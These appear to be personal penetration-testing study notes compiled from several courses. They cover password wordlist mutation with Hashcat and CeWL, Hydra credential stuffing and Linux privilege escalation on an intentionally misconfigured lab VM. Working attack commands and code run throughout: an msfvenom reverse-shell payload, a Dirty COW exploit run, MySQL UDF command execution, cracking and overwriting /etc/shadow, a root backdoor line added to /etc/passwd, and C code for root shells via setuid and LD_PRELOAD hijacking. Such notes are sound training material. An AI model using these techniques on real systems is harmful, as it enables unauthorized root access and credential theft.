
password
```
We can use a very powerful tool called Hashcat
```
https://hashcat.net/hashcat/
```
to combine lists of potential names and labels with specific mutation rules to create custom wordlists.

Hashcat uses a specific syntax for defining characters and words and how they can be modified. The complete list of this syntax can be found in the official documentation
```
https://hashcat.net/wiki/doku.php?id=rule_based_attack
```
of Hashcat. However, the ones listed below are enough for us to understand how Hashcat mutates words.

![image](https://user-images.githubusercontent.com/24814781/203632158-23d50fb8-f5fc-48f5-a857-32ff0412c931.png)

Each rule is written on a new line which determines how the word should be mutated. If we write the functions shown above into a file and consider the aspects mentioned, this file can then look like this:

### Hashcat Rule File
example:
```
Suljov@htb[/htb]$ cat custom.rule

:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```

Hashcat will apply the rules of custom.rule for each word in password.list and store the mutated version in our mut_password.list accordingly. Thus, one word will result in fifteen mutated words in this case.

### Generating Rule-based Wordlist

```
Suljov@htb[/htb]$ hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
Suljov@htb[/htb]$ cat mut_password.list

password
Password
passw0rd
Passw0rd
p@ssword
P@ssword
P@ssw0rd
password!
Password!
passw0rd!
p@ssword!
Passw0rd!
P@ssword!
p@ssw0rd!
P@ssw0rd!
```

Hashcat and John come with pre-built rule lists that we can use for our password generating and cracking purposes. One of the most used rules is best64.rule, which can often lead to good results. It is important to note that password cracking and the creation of custom wordlists is a guessing game in most cases. We can narrow this down and perform more targeted guessing if we have information about the password policy and take into account the company name, geographical region, industry, and other topics/words that users may select from to create their passwords. Exceptions are, of course, cases where passwords are leaked and found.

### Hashcat Existing Rules

```
Suljov@htb[/htb]$ ls /usr/share/hashcat/rules/

best64.rule                  specific.rule
combinator.rule              T0XlC-insert_00-99_1950-2050_toprules_0_F.rule
d3ad0ne.rule                 T0XlC-insert_space_and_special_0_F.rule
dive.rule                    T0XlC-insert_top_100_passwords_1_G.rule
generated2.rule              T0XlC.rule
generated.rule               T0XlCv1.rule
hybrid                       toggles1.rule
Incisive-leetspeak.rule      toggles2.rule
InsidePro-HashManager.rule   toggles3.rule
InsidePro-PasswordsPro.rule  toggles4.rule
leetspeak.rule               toggles5.rule
oscommerce.rule              unix-ninja-leetspeak.rule
rockyou-30000.rule
```

We can now use another tool called CeWL
```
https://github.com/digininja/CeWL
```

to scan potential words from the company's website and save them in a separate list. We can then combine this list with the desired rules and create a customized password list that has a higher probability of guessing a correct password. We specify some parameters, like the depth to spider (-d), the minimum length of the word (-m), the storage of the found words in lowercase (--lowercase), as well as the file where we want to store the results (-w).

### Generating Wordlists Using CeWL
```
Suljov@htb[/htb]$ cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
Suljov@htb[/htb]$ wc -l inlane.wordlist

326
```
-----

## Password Reuse andfault Passwords

It is common for both users and administrators to leave defaults in place. Administrators have to keep track of all the technology, infrastructure, and applications along with the data being accessed. In this case, the same password is often used for configuration purposes, and then the password is forgotten to be changed for one interface or another. In addition, many applications that work with authentication mechanisms, basically almost all, often come with default credentials after installation. These default credentials may be forgotten to be changed after configuration, especially when it comes to internal applications where the administrators assume that no one else will find them and do not even try to use them.

In addition, easy-to-remember passwords that can be typed quickly instead of typing 15-character long passwords are often used repeatedly because Single-Sign-On (SSO)
```
https://en.wikipedia.org/wiki/Single_sign-on
```

is not always immediately available during initial installation, and configuration in internal networks requires significant changes. When configuring networks, we sometimes work with vast infrastructures (depending on the company's size) that can have many hundreds of interfaces. Often one network device, such as a router, printer, or a firewall, is overlooked, and the default credentials are used, or the same password is reused.

## Credential Stuffing

There are various databases that keep a running list of known default credentials. One of them is the DefaultCreds-Cheat-Sheet.

```
https://github.com/ihebski/DefaultCreds-cheat-sheet
```
Here is a small excerpt from the entire table of this cheat sheet:


![image](https://user-images.githubusercontent.com/24814781/203636551-c04ce3b0-b130-4da4-a900-1285d9041ec1.png)

Default credentials can also be found in the product documentation, as they contain the steps necessary to set up the service successfully. Some devices/applications require the user to set up a password at install, but others use a default, weak password. Attacking those services with the default or obtained credentials is called Credential Stuffing.

```
https://owasp.org/www-community/attacks/Credential_stuffing
```
This is a simplified variant of brute-forcing because only composite usernames and the associated passwords are used.

We can imagine that we have found some applications used in the network by our customers. After searching the internet for the default credentials, we can create a new list that separates these composite credentials with a colon (username:password). In addition, we can select the passwords and mutate them by our rules to increase the probability of hits.

### Credential Stuffing - Hydra Syntax

```
Suljov@htb[/htb]$ hydra -C <user_pass.list> <protocol>://<IP>
```
### Credential Stuffing - Hydra

```
Suljov@htb[/htb]$ hydra -C user_pass.list ssh://10.129.42.197
...

```

Here, OSINT plays another significant role. Because OSINT gives us a "feel" for how the company and its infrastructure are structured, we will understand which passwords and user names we can combine. We can then store these in our lists and use them afterward. In addition, we can use Google to see if the applications we find have hardcoded credentials that can be used.

### Google Search - Default Credentials

![image](https://user-images.githubusercontent.com/24814781/203636820-19ca5c50-da00-43a1-85f4-c0e2dd8505cf.png)

Besides the default credentials for applications, some lists offer them for routers. One of these lists can be found here. It is much less likely that the default credentials for routers are left unchanged. Since these are the central interfaces for networks, administrators typically pay much closer attention to hardening them. Nevertheless, it is still possible that a router is overlooked or is currently only being used in the internal network for test purposes, which we can then exploit for further attacks.

![image](https://user-images.githubusercontent.com/24814781/203636874-ff8bd3f8-9e83-4f7f-98e6-78d246a77575.png)

--------------------------------------------------------------------------------------------------------------------------------------------------------
# Linux Privilige Escalation

## Tib3rius ⁣Privilege Escalation

### Setup 
This course will be using the Debian VM from the
following workshop:
https://github.com/sagishahar/lpeworkshop
The Debian VM has been intentionally misconfigured
with numerous privilege escalation methods.

#### Setup (cont.)
You can download the VM from the Udemy course page.
The version on Udemy includes a few new methods of
privilege escalation. It is recommended that you use this VM
for the course.
The “user” account password is: password321
The “root” account password is: password123

If for some reason you need to use the original VM, or
perhaps you already have it set up, I have created a Bash
script which integrates a few more misconfigurations into the
VM: https://github.com/Tib3rius/privesc-setup
Log onto the VM as the root user (root/password123) and
run the script.

### General Concepts

Our ultimate goal with privilege escalation in Linux is to gain a shell
running as the root user.
Privilege escalation can be simple (e.g. a kernel exploit) or require a
lot of reconnaissance on the compromised system.
In a lot of cases, privilege escalation may not simply rely on a single
misconfiguration, but may require you to think, and combine
multiple misconfigurations.

All privilege escalations are effectively examples of access
control violations.
Access control and user permissions are intrinsically linked.
When focusing on privilege escalations in Linux,
understanding how Linux handles permissions is very
important.

## Understanding Permissions in Linux

#### Users Groups and Files and Directories
At a basic level, permissions in Linux are a relationship between
users, groups, and files & directories.
Users can belong to multiple groups.
Groups can have multiple users.
Every file and directory defines its permissions in terms of a user, a
group, and “others” (all other users).

#### priv-esc Users

User accounts are configured in the /etc/passwd file.
User password hashes are stored in the /etc/shadow file.
Users are identified by an integer user ID (UID).
The “root” user account is a special type of account in Linux.
It has an UID of 0, and the system grants this user access to
every file.

#### Groups

Groups are configured in the /etc/group file.
Users have a primary group, and can have multiple
secondary (or supplementary) groups.
By default, a user’s primary group has the same name
as their user account.

#### Files and Directories
All files & directories have a single owner and a group.
Permissions are defined in terms of read, write, and execute
operations.
There are three sets of permissions, one for the owner, one for
the group, and one for all “other” users (can also be referred to
as “world”).
Only the owner can change permissions.

#### File Permissions
File permissions are self explanatory:
• Read – when set, the file contents can be read.
• Write – when set, the file contents can be modified.
• Execute – when set, the file can be executed (i.e. run as
some kind of process).

#### Directory Permissions
Directory permissions are slightly more complicated:
• Execute – when set, the directory can be entered. Without this
permission, neither the read nor write permissions will work.
• Read – when set, the directory contents can be listed.
• Write – when set, files and subdirectories can be created in the
directory.

#### Special Permissions
setuid (SUID) bit
When set, files will get executed with the privileges of the file owner.
setgid (SGID) bit
When set on a file, the file will get executed with the privileges of the
file group.
When set on a directory, files created within that directory will inherit
the group of the directory itself.

#### Viewing Permissions
The ls command can be used to view permissions:
```
$ ls -l /bin/date
-rwxr-xr-x 1 root root 60416 Apr 28 2010 /bin/date
```
The first 10 characters indicate the permissions set on the file
or directory.
The first character simply indicates the type (e.g. '-' for file, 'd'
for directory).

#### Viewing Permissions
The remaining 9 characters represent the 3 sets of
permissions (owner, group, others).
Each set contains 3 characters, indicating the read (r), write
(w), and execute (x) permissions.
SUID/SGID permissions are represented by an 's' in the
execute position.

#### Real and Effective and Saved UID and GID
I previously stated that users are identified by a user ID.
In fact, each user has 3 user IDs in Linux (real, effective, and
saved).
A user’s real ID is who they actually are (the ID defined in
/etc/passwd). Ironically, the real ID is actually used less often to
check a user’s identity.

A user’s effective ID is normally equal to their real ID, however when
executing a process as another user, the effective ID is set to that user’s
real ID.
The effective ID is used in most access control decisions to verify a user,
and commands such as whoami use the effective ID.
Finally, the saved ID is used to ensure that SUID processes can
temporarily switch a user’s effective ID back to their real ID and back
again without losing track of the original effective ID

Print real and effective user / group IDs:
```
# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

Print real, effective, saved, and file system user / group IDs of
the current process (i.e. our shell):
```
# cat /proc/$$/status | grep "[UG]id"
Uid: 1000 0 0 0
Gid: 1000 0 0 0
```

## Spawning Root Shells

As stated in the introduction to this course, our ultimate goal is to
spawn a root shell.
While the end result is the same (executing /bin/sh or /bin/bash),
there are multiple ways of achieving this execution.
In this course, we will use a variety of methods. This section
highlights a few which can be used in situations where commands
can be executed as root.

### rootbash SUID
One of my favorite ways to spawn a root shell is to create a copy
of the /bin/bash executable file (I usually rename it rootbash),
make sure it is owned by the root user, and has the SUID bit set.
A root shell can be spawned by simply executing the rootbash file
with the -p command line option.
The benefit of this method is it is persistent (once you run the
exploit, rootbash can be used multiple times).

### Custom Executable
There may be instances where some root process executes another
process which you can control. In these cases, the following C code,
once compiled, will spawn a Bash shell running as root:

```
int main() {
setuid(0);
system("/bin/bash -p");
}
```
Compile using:
```
$ gcc -o <name> <filename.c>
```

msfvenom
Alternatively, if a reverse shell is preferred, msfvenom
can be used to generate an executable (.elf) file:
```
$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
```
This reverse shell can be caught using netcat or
Metasploit’s own multi/handler.

### Native Reverse Shells
There are multiple ways to spawn reverse shells natively
on many Linux distributions.
A good tool for suggesting these is:
https://github.com/mthbernardes/rsg
All can be caught using a simple netcat listener.

## Privilege Escalation Tools

#### Why use tools
Tools allow us to automate the reconnaissance that can identify
potential privilege escalations.
While it is always important to understand what tools are doing,
they are invaluable in a time-limited setting, such as an exam.
In this course we will use Linux Smart Enumeration and LinEnum.

### Linux Smart Enumeration
Linux Smart Enumeration (lse.sh) has recently become my
personal favorite privilege escalation tool.
In addition to being a Bash script (which helps if Python isn’t
installed), it has multiple levels which gradually reveal more
and more information.
https://github.com/diego-treitos/linux-smart-enumeration

### LinEnum
LinEnum is an advanced Bash script which extracts a large
amount of useful information from the target system.
It can copy interesting files for export, and search for files
containing a keyword (e.g. “password”).
```
https://github.com/rebootuser/LinEnum
```

### Other Tools
While we won’t use these tools in the course, feel free to
experiment with them:
• https://github.com/linted/linuxprivchecker
• https://github.com/AlessandroZ/BeRoot
• http://pentestmonkey.net/tools/audit/unix-privesc-check

## Kernel Exploits

Kernels are the core of any operating system.
Think of it as a layer between application software and the
actual computer hardware.
The kernel has complete control over the operating system.
Exploiting a kernel vulnerability can result in execution as the
root user.

Finding and using kernel exploits is usually a simple process:
1. Enumerate kernel version (uname -a).
2. Find matching exploits (Google, ExploitDB, GitHub).
3. Compile and run.
Beware though, as Kernel exploits can often be unstable and
may be one-shot or cause a system crash.

### Privilege Escalation
1. Enumerate the kernel version:
```
$ uname -a
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_6
4 GNU/Linux
```
2.Use searchsploit to find matching exploits:
```
# searchsploit linux kernel 2.6.32 priv esc
```
Note that none of the exploits match the distribution of Linux (Debian).

3.
We can try and adjust our search to be less specific with the kernel version, but
more specific with the distribution:
```
# searchsploit linux kernel 2.6 priv esc debian
```
Again, we get a few exploits that we can’t use for various reasons.
4.
Install Linux Exploit Suggester 2 (https://github.com/jondonas/linux-exploit-
suggester-2) and run the tool against the original kernel version:
```
# ./linux-exploit-suggester-2.pl –k 2.6.32
```
This reveals a popular kernel exploit (Dirty COW).
5.There are a number of Dirty COW exploits, all of which use
different methods to obtain a root shell. The following
version seems to work best on the practice VM:
https://gist.github.com/KrE80r/42f8629577db95782d5e4f6
09f437a54
6.Download and compile it using the instructions in the file:
```
$ gcc -pthread c0w.c -o c0w
```
7. Run the exploit:
```
$ ./c0w
```
8. Once the exploit is complete, simply execute the
/usr/bin/passwd binary to get a root shell:
```
$ /usr/bin/passwd
root@debian:/home/user# id
uid=0(root) gid=1000(user) groups=0(root) ...
```
## Service Exploits

Services are simply programs that run in the background,
accepting input or performing regular tasks.
If vulnerable services are running as root, exploiting them can
lead to command execution as root.
Service exploits can be found using Searchsploit, Google, and
GitHub, just like with Kernel exploits.


### Services Running as Root

The following command will show all processes that are
running as root:
```
$ ps aux | grep "^root"
```
With any results, try to identify the version number of
the program being executed.

### Enumerating Program Versions

Running the program with the --version/-v command line option often shows the
version number:
```
$ <program> --version
$ <program> -v
```
On Debian-like distributions, dpkg can show installed programs and their version:
```
$ dpkg -l | grep <program>
```
On systems that use rpm, the following achieves the same:
```
$ rpm –qa | grep <program>
```

### Privilege Escalation 
1.
Enumerate the processes running as root:
```
$ ps aux | grep "^root”
...
root
6933 0.0 4.9 165472 24376 pts/0
Sl
02:13
0:02 /usr
/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root ...
```
Note that the mysqld process is running as root.
2.
Enumerate the version of mysqld:
```
$ mysqld --version
mysqld Ver 5.1.73-1+deb6u1 for debian-linux-gnu on x86_64 ((Debian))
```

3.
MySQL has the ability to install User Defined Functions
(UDF) which run via shared objects.
4.
Follow the instructions in this exploit to compile and
install a UDF which executes system commands:
https://www.exploit-db.com/exploits/1518
Note: some commands may require slight modification.

5.
Once the UDF is installed, run the following command in the MySQL shell:
```
mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/ro
otbash');
```
6.
Drop back to our regular shell, and run /tmp/rootbash for a root shell:
```
$ /tmp/rootbash -p
rootbash-4.1# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

### Port Forwarding
In some instances, a root process may be bound to an internal port,
through which it communicates.
If for some reason, an exploit cannot run locally on the target machine,
the port can be forwarded using SSH to your local machine:
$ ssh -R <local-port>:127.0.0.1:<target-port> <username>@<local-machine>
The exploit code can now be run on your local machine at whichever
port you chose.
  
## Weak File Permissions 1

Certain system files can be taken advantage of to perform
privilege escalation if the permissions on them are too weak.
If a system file has confidential information we can read, it may
be used to gain access to the root account.
If a system file can be written to, we may be able to modify the
way the operating system works and gain root access that way.

### Useful Commands
Find all writable files in /etc:
```
$ find /etc -maxdepth 1 -writable -type f

```
Find all readable files in /etc:
```
$ find /etc -maxdepth 1 -readable -type f
```
Find all directories which can be written to:
```
$ find / -executable -writable -type d 2> /dev/null
```

### /etc/shadow
The /etc/shadow file contains user password hashes, and by
default is not readable by any user except for root.
If we are able to read the contents of the /etc/shadow file, we
might be able to crack the root user’s password hash.
If we are able to modify the /etc/shadow file, we can replace
the root user’s password hash with one we know.

### Privilege Escalation
1. Check the permissions of the /etc/shadow file:
```
$ ls -l /etc/shadow
-rw-r—rw- 1 root shadow 810 May 13 2017 /etc/shadow
```
Note that it is world readable.
2. Extract the root user’s password hash:
```
$ head -n 1 /etc/shadow
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
```

3.
Save the password hash in a file (e.g. hash.txt):
```
$ echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' > hash.txt'
```
4.
Crack the password hash using john:
```
$ john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
...
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Press 'q' or Ctrl-C to abort, almost any other key for status
password123 (?)
```
5. Use the su command to switch to the root user,
entering the password we cracked when prompted:
```
$ su
Password:
root@debian:/# id
uid=0(root) gid=0(root) groups=0(root)
```

### Privilege Escalation (#2)
1. Check the permissions of the /etc/shadow file:
```
$ ls -l /etc/shadow
-rw-r—rw- 1 root shadow 810 May 13 2017 /etc/shadow
```
Note that it is world writable.
2. Copy / save the contents of /etc/shadow so we can
restore it later.

3. Generate a new SHA-512 password hash:
```
$ mkpasswd -m sha-512 newpassword
$6$DoH8o2GhA$5A7DHvXfkIQO1Zctb834b.SWIim2NBNys9D9h5wUvYK3IOGdxoOlL9VEWwO/okK3vi1IdVaO9.xt4IQMY4OUj/
```
4. Edit the /etc/shadow and replace the root user’s
password hash with the one we generated.
```
root:$6$DoH8o2GhA$5A7DHvXfkIQO1Zctb834b.SWIim2NBNys9D9h5wUvYK3IOGdxoOlL9VEWwO/okK3vi1IdVaO9.xt4IQMY4OUj/:17298:0:99999:7:::
```

5. Use the su command to switch to the root user,
entering the new password when prompted:
```
$ su
Password:
root@debian:/# id
uid=0(root) gid=0(root) groups=0(root)
```

### /etc/passwd
The /etc/passwd historically contained user password hashes.
For backwards compatibility, if the second field of a user row in /etc/passwd
contains a password hash, it takes precedent over the hash in /etc/shadow.
If we can write to /etc/passwd, we can easily enter a known password hash for
the root user, and then use the su command to switch to the root user.
Alternatively, if we can only append to the file, we can create a new user but
assign them the root user ID (0). This works because Linux allows multiple entries
for the same user ID, as long as the usernames are different.

The root account in /etc/passwd is usually configured like this:
```
root:x:0:0:root:/root:/bin/bash
```
The “x” in the second field instructs Linux to look for the password hash
in the /etc/shadow file.
In some versions of Linux, it is possible to simply delete the “x”, which
Linux interprets as the user having no password:
```
root::0:0:root:/root:/bin/bash
```

### Privilege Escalation
1.
Check the permissions of the /etc/passwd file:
```
$ ls -l /etc/passwd
-rw-r--rw- 1 root root 951 May 13 2017 /etc/passwd
```
Note that it is world writable.
2.
Generate a password hash for the password “password”
using openssl:
```
$ openssl passwd "password" 
L9yLGxncbOROc
```
3. Edit the /etc/passwd file and enter the hash in the
second field of the root user row:
```
root:L9yLGxncbOROc:0:0:root:/root:/bin/bash
```
4. Use the su command to switch to the root user:
```
$ su
Password:
# id
uid=0(root) gid=0(root) groups=0(root)
```

5. Alternatively, append a new row to /etc/passwd to
create an alternate root user (e.g. newroot):
```
newroot:L9yLGxncbOROc:0:0:root:/root:/bin/bash
```
6. Use the su command to switch to the newroot user:
```
$ su newroot
Password:
# id
uid=0(root) gid=0(root) groups=0(root)
```

## Backups
Even if a machine has correct permissions on important or
sensitive files, a user may have created insecure backups of
these files.
It is always worth exploring the file system looking for readable
backup files. Some common places include user home
directories, the / (root) directory, /tmp, and /var/backups.

### Privilege Escalation
1.
Look for interesting files, especially hidden files, in common
locations:
```
$ ls -la /home/user
$ ls -la /
$ ls -la /tmp
$ ls -la /var/backups
```
2.
Note that a hidden .ssh directory exists in the system root:
```
$ ls -la /
drwxr-xr-x 2 root root 4096 Aug 24 18:57 .ssh
```

3.
In this directory, we can see a world-readable file called root_key:
```
$ ls -l /.ssh
total 4 -rw-r--r-- 1 root root 1679 Aug 24 18:57 root_key
```
4.
Further inspection of this file seems to indicate that this is an SSH private
key. The name and owner of the file suggests this key belongs to the root
user:
```
$ head -n 1 /.ssh/root_key
-----BEGIN RSA PRIVATE KEY-----
```

5.
Before we try to use this key, let’s confirm that root logins are even
allowed via SSH:
```
$ grep PermitRootLogin /etc/ssh/sshd_config
PermitRootLogin yes
```
6.
Copy the key over to your local machine, and give it correct
permissions (otherwise SSH will refuse to use it):
```
# chmod 600 root_key
```

7. Use the key to SSH to the target as the root account:
```
# ssh -i root_key root@192.168.1.25
```

## sudo

### What is sudo
What is sudo?
sudo is a program which lets users run other programs with the security
privileges of other users. By default, that other user will be root.
A user generally needs to enter their password to use sudo, and they
must be permitted access via rule(s) in the /etc/sudoers file.
Rules can be used to limit users to certain programs, and forgo the
password entry requirement.

### Useful sudo Commands
Run a program using sudo:
```
$ sudo <program>
```
Run a program as a specific user:
```
$ sudo –u <username> <program>
```
List programs a user is allowed (and disallowed) to run:
```
$ sudo -l
```

### Known Password
By far the most obvious privilege escalation with sudo is to use sudo as it
was intended!
If your low privileged user account can use sudo unrestricted (i.e. you can
run any programs) and you know the user’s password, privilege escalation
is easy, by using the “switch user” (su) command to spawn a root shell:
```
$ sudo su
```

### Other Methods
If for some reason the su program is not allowed, there are many other
ways to escalate privileges:
```
$ sudo -s
$ sudo -i
$ sudo /bin/bash
$ sudo passwd
```
Even if there are no “obvious” methods for escalating privileges, we may
be able to use a shell escape sequence.

### Shell Escape Sequences
Even if we are restricted to running certain programs via sudo, it is
sometimes possible to “escape” the program and spawn a shell.
Since the initial program runs with root privileges, so does the
spawned shell.
A list of programs with their shell escape sequences can be found
here: https://gtfobins.github.io/

### Privilege Escalation (Generic)
1. List the programs your user is allowed to run via
sudo:
```
$ sudo -l
...
(root) NOPASSWD: /usr/sbin/iftop
(root) NOPASSWD: /usr/bin/find
(root) NOPASSWD: /usr/bin/nano
(root) NOPASSWD: /usr/bin/vim
(root) NOPASSWD: /usr/bin/man
(root) NOPASSWD: /usr/bin/awk
...
```
2. For each program in the list, see if there is a shell
escape sequence on GTFOBins
(https://gtfobins.github.io/)
3.
If an escape sequence exists, run the program via
sudo and perform the sequence to spawn a root
shell.

### Abusing Intended Functionality
If a program doesn’t have an escape sequence, it may still be
possible to use it to escalate privileges.
If we can read files owned by root, we may be able to extract
useful information (e.g. passwords, hashes, keys).
If we can write to files owned by root, we may be able to insert
or modify information.

### Privilege Escalation
1.
List the programs your user is allowed to run via sudo:
```
$ sudo -l
...
(root) NOPASSWD: /usr/sbin/apache2
```
Note that apache2 is in the list.
2.
apache2 doesn’t have any known shell escape
sequences, however when parsing a given config file, it
will error and print any line it doesn’t understand.
3. Run apache2 using sudo, and provide it the
/etc/shadow file as a config file:
```
$ sudo apache2 -f /etc/shadow
Syntax error on line 1 of /etc/shadow:
Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7::
:', perhaps misspelled or defined by a module not included in the server configuration
```
4. Extract the root user’s hash from the file.
5.
Save the password hash in a file (e.g. hash.txt):
```
$ echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' > hash.txt'
```
6.
Crack the password hash using john:
```
$ john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
...
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Press 'q' or Ctrl-C to abort, almost any other key for status
password123 (?)
```
7. Use the su command to switch to the root user,
entering the password we cracked when prompted:
```
$ su
Password:
root@debian:/# id
uid=0(root) gid=0(root) groups=0(root)
```

### Environment Variables
Programs run through sudo can inherit the environment variables
from the user’s environment.
In the /etc/sudoers config file, if the env_reset option is set, sudo
will run programs in a new, minimal environment.
The env_keep option can be used to keep certain environment
variables from the user’s environment.
The configured options are displayed when running sudo -l

### LD PRELOAD
LD_PRELOAD is an environment variable which can be set to
the path of a shared object (.so) file.
When set, the shared object will be loaded before any others.
By creating a custom shared object and creating an init()
function, we can execute code as soon as the object is loaded.

### Limitations
LD_PRELOAD will not work if the real user ID is different
from the effective user ID.
sudo must be configured to preserve the LD_PRELOAD
environment variable using the env_keep option.

### Privilege Escalation
1. List the programs your user is allowed to run via
sudo:
```
$ sudo -l
```
Matching Defaults entries for user on this host:
env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
...
Note that the env_keep option includes the
LD_PRELOAD environment variable.


2. Create a file (preload.c) with the following contents:
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
  unsetenv("LD_PRELOAD");
  setresuid(0,0,0);
  system("/bin/bash -p");
}
```
3.
Compile preload.c to preload.so:
```
$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
```
4.
Run any allowed program using sudo, while setting the
LD_PRELOAD environment variable to the full path of the
preload.so file:
```
$ sudo LD_PRELOAD=/tmp/preload.so apache2
# id
uid=0(root) gid=0(root) groups=0(root)
```

### LD LIBRARY PATH
The LD_LIBRARY_PATH environment variable contains a set of directories where
shared libraries are searched for first.
The ldd command can be used to print the shared libraries used by a program:
$ ldd /usr/sbin/apache2
By creating a shared library with the same name as one used by a program, and
setting LD_LIBRARY_PATH to its parent directory, the program will load our
shared library instead.

### Privilege Escalation
1.
Run ldd against the apache2 program file:
```
$ ldd /usr/sbin/apache2
linux-vdso.so.1 => (0x00007fff063ff000)
...
  libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f7d4199d000)
  libdl.so.2 => /lib/libdl.so.2 (0x00007f7d41798000)
  libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f7d41570000)
  /lib64/ld-linux-x86-64.so.2 (0x00007f7d42e84000)
```
Hijacking shared objects using this method is hit or miss. Choose one from
the list and try it (libcrypt.so.1 seems to work well).

2.
Create a file (library_path.c) with the following contents:
```
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
  unsetenv("LD_LIBRARY_PATH");
  setresuid(0,0,0);
  system("/bin/bash -p");
}
```

3.
Compile library_path.c into libcrypt.so.1:
```
$ gcc -o libcrypt.so.1 -shared -fPIC library_path.c
```
4.
Run apache2 using sudo, while setting the
LD_LIBRARY_PATH environment variable to the current
path (where we compiled library_path.c):
```
$ sudo LD_LIBRARY_PATH=. apache2
# id
uid=0(root) gid=0(root) groups=0(root)
```

### Cron Jobs
---------------------------------------------------------------------------------------------------------------------------------------------------------

## Linux Privilige Escalation 1

### Automated Enumeration Tools




Several tools can help you save time during the enumeration process. These tools should only be used to save time knowing they may miss some privilege escalation vectors. Below is a list of popular Linux enumeration tools with links to their respective Github repositories.

The target system’s environment will influence the tool you will be able to use. For example, you will not be able to run a tool written in Python if it is not installed on the target system. This is why it would be better to be familiar with a few rather than having a single go-to tool.

*    LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
*    LinEnum: https://github.com/rebootuser/LinEnum
*    LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
*    Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
*    Linux Priv Checker: https://github.com/linted/linuxprivchecker 

# Enumeration

#### hostname


The hostname command will return the hostname of the target machine. Although this value can easily be changed or have a relatively meaningless string (e.g. Ubuntu-3487340239), in some cases, it can provide information about the target system’s role within the corporate network (e.g. SQL-PROD-01 for a production SQL server).

#### uname -a

Will print system information giving us additional detail about the kernel used by the system. This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.

#### /proc/version

The proc filesystem (procfs) provides information about the target system processes. You will find proc on many different Linux flavours, making it an essential tool to have in your arsenal.

Looking at /proc/version may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed. 

#### /etc/issue

Systems can also be identified by looking at the /etc/issue file. This file usually contains some information about the operating system but can easily be customized or changes. While on the subject, any file containing system information can be customized or changed. For a clearer understanding of the system, it is always good to look at all of these.


####  ps Command

The ps command is an effective way to see the running processes on a Linux system. Typing ps on your terminal will show processes for the current shell.

The output of the ps (Process Status) will show the following;

*    PID: The process ID (unique to the process)
*    TTY: Terminal type used by the user
*    Time: Amount of CPU time used by the process (this is NOT the time this process has been running for)
*    CMD: The command or executable running (will NOT display any command line parameter)

The “ps” command provides a few useful options.

    ps -A: View all running processes
    ps axjf: View process tree (see the tree formation until ps axjf is run below)
![image](https://user-images.githubusercontent.com/24814781/197411539-bd47d6ab-36ec-4cad-ad1a-aa9f06079845.png)

* ps aux: The aux option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x). Looking at the ps aux command output, we can have a better understanding of the system and potential vulnerabilities.


####  env


The env command will show environmental variables.

![image](https://user-images.githubusercontent.com/24814781/197411586-6d05fc5f-18fe-4ff6-a2e4-fd6d9d216d67.png)

The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.

#### sudo -l


The target system may be configured to allow users to run some (or all) commands with root privileges. The sudo -l command can be used to list all commands your user can run using sudo.


#### ls

One of the common commands used in Linux is probably ls.


While looking for potential privilege escalation vectors, please remember to always use the ls command with the -la parameter. The example below shows how the “secret.txt” file can easily be missed using the ls or ls -l commands.

![image](https://user-images.githubusercontent.com/24814781/197411636-7d079989-19ab-4bc2-a63a-829407b758e4.png)

####  Id


The id command will provide a general overview of the user’s privilege level and group memberships.


It is worth remembering that the id command can also be used to obtain the same information for another user as seen below.

![image](https://user-images.githubusercontent.com/24814781/197411650-89e05f71-8c63-4b51-aa79-452ff8e0590d.png)

####  /etc/passwd


Reading the /etc/passwd file can be an easy way to discover users on the system. 
![image](https://user-images.githubusercontent.com/24814781/197411679-84dec38b-7fc6-4373-8cdb-c61d8cd4327b.png)

While the output can be long and a bit intimidating, it can easily be cut and converted to a useful list for brute-force attacks. 

![image](https://user-images.githubusercontent.com/24814781/197411689-f8a252f3-be5b-496c-a8bc-e00a05bb32d5.png)

